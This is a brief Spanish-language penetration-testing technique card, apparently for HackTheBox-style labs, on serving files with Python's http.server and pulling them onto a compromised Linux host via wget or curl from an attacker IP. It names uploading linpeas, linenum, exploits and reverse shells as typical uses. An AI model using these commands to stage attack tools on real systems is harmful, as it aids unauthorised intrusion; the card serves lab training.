---
chunk_id: technique::linux::privesc::file-transfer::http-python::001
domain: linux
chunk_type: technique
---

## File-Transfer Linpeas

###  Paso 1: Levantar un servidor HTTP con Python

```bash
cd /tmp
python3 -m http.server 8000
```

- Esto lanza un servidor web en el puerto 8000.
    
- Cualquier archivo en `/tmp` estará disponible en `http://<tu-ip>:8000`
    
- Útalo en la carpeta donde está el archivo que deseas transferir.
    

---

###  Paso 2: Descargar el archivo en la máquina remota

Usa `wget` si está disponible:

```bash
wget http://10.10.14.1:8000/linenum.sh
```

Si no hay `wget`, usa `curl`:

```bash
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

- `10.10.14.1`: Tu IP atacante (verifícala con `ip a` o `tun0` en HTB)
    
- `-o linenum.sh`: Especifica el nombre del archivo a guardar
    

---

###  Casos de uso típicos

- Subir scripts de enumeración como `linenum.sh` o `linpeas.sh`
    
- Transferir exploits, reverse shells, binarios
    
- Copiar archivos de configuración personalizados
    

---
